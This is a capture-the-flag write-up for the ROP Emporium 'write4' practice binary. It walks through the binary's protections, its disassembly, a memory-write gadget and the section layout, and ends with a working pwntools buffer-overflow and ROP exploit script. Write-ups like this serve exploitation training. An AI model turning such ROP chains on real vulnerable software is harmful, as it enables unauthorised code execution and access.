# write4(ROP Emporium 4)

## Information

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

### print_file
```asm
 943:	55                   	push   rbp
 944:	48 89 e5             	mov    rbp,rsp
 947:	48 83 ec 40          	sub    rsp,0x40
 94b:	48 89 7d c8          	mov    QWORD PTR [rbp-0x38],rdi
 94f:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
 956:	00 
 957:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
 95b:	48 8d 35 d5 00 00 00 	lea    rsi,[rip+0xd5]        # a37 <_fini+0x67>
 962:	48 89 c7             	mov    rdi,rax
 965:	e8 36 fe ff ff       	call   7a0 <fopen@plt>
 96a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
 96e:	48 83 7d f8 00       	cmp    QWORD PTR [rbp-0x8],0x0
 973:	75 22                	jne    997 <print_file+0x54>
 975:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
 979:	48 89 c6             	mov    rsi,rax
 97c:	48 8d 3d b6 00 00 00 	lea    rdi,[rip+0xb6]        # a39 <_fini+0x69>
 983:	b8 00 00 00 00       	mov    eax,0x0
 988:	e8 c3 fd ff ff       	call   750 <printf@plt>
 98d:	bf 01 00 00 00       	mov    edi,0x1
 992:	e8 19 fe ff ff       	call   7b0 <exit@plt>
 997:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
 99b:	48 8d 45 d0          	lea    rax,[rbp-0x30]
 99f:	be 21 00 00 00       	mov    esi,0x21
 9a4:	48 89 c7             	mov    rdi,rax
 9a7:	e8 d4 fd ff ff       	call   780 <fgets@plt>
 9ac:	48 8d 45 d0          	lea    rax,[rbp-0x30]
 9b0:	48 89 c7             	mov    rdi,rax
 9b3:	e8 78 fd ff ff       	call   730 <puts@plt>
 9b8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
 9bc:	48 89 c7             	mov    rdi,rax
 9bf:	e8 7c fd ff ff       	call   740 <fclose@plt>
 9c4:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
 9cb:	00 
 9cc:	90                   	nop
 9cd:	c9                   	leave
 9ce:	c3                   	ret
```
rdi = 第1引数でファイル名 これを"flag.txt"にしたい

### usefulGadgets
```asm
  400628:	4d 89 3e             	mov    QWORD PTR [r14],r15
  40062b:	c3                   	ret
  40062c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
```

### section
```zsh
└─$ rabin2 -S ./write4 
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```
0x601028に書き込めばよさそうかな

## Solution

### strategy
1. set r15: "flag.txt" (with ROP gadget)
2. set r14: 0x601028
3. set rdi: 0x601028
4. call usefulGadget
5. call `print_file`: 0x400510

## Script
```python
from pwn import *

elf = ELF('./write4')
rop = ROP(elf)

conn = process('./write4')

payload = b'A'*0x28
payload += p64(rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0])
payload += p64(0x601028)
payload += b'flag.txt'
payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(elf.symbols['usefulGadgets'])
payload += p64(elf.symbols['print_file'])

conn.sendline(payload)
conn.interactive()
```